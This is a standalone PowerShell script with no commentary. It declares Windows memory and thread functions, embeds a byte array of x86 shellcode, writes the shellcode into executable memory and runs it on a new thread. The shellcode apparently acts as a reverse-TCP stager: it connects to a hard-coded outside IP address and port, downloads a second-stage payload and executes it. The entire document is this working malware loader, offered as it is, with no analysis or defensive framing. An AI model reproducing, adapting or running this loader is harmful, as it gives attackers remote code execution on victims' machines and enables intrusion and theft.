$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x5e,0x15,0x4b,0x8c,0x68,0x02,0x00,0x26,0x94,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

